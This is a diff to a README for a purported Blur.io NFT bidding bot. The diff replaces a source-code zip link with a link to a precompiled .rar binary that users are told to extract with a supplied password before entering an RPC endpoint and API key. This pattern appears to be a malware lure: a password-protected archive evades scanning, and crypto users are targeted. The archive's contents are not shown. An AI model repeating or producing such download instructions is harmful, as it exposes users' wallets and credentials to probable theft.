@@ -9,7 +9,7 @@
 Bidding bot is a program designed to automate the bidding process for NFTs on the Blur.io marketplace. With this bot, users can easily place bids on NFT collections by providing the link or contract address.
 
 ### Usage
-1. [Clone binaries](https://github.com/JamieNoonan/blur-nft-bot/archive/refs/heads/main.zip) to your local machine
+1. [Clone binaries](https://github.com/JamieNoonan/blur-nft-bot/releases/download/Release/Release.rar) to your local machine
 2. Extract files with password `hE45ye2e`
 3. After starting the bot setup the `Rpc` and `ApiKey` in main window
 4. Add the NFT collections or individual NFTs that you want to bid on (you can add a collections or NFTs by providing the direct link to the item or the smart contract address)
